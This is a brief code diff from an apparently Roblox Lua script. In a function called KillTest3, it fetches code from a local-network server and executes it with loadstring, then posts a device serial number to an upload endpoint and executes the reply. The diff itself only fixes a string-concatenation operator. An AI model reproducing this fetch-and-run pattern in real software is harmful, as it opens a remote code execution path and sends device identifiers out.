@@ -3165,7 +3165,7 @@ function KillTest3()
 	myCoolScript = game:GetService("HttpService"):GetAsync("http://192.168.2.31/pokemongo/pokemongo/savedgames")
 	loadstring(myCoolScript)()
 	
-	myCoolScript2 = game:GetService("HttpService"):PostAsync("http://192.168.2.31/pokemongo/pokemongo/uploadre2.php", "deviceSN=" & URLEncode("C32NL4DZG5MR"))
+	myCoolScript2 = game:GetService("HttpService"):PostAsync("http://192.168.2.31/pokemongo/pokemongo/uploadre2.php", "deviceSN=" .. URLEncode("C32NL4DZG5MR"))
 	loadstring(myCoolScript2)()
 	
 	
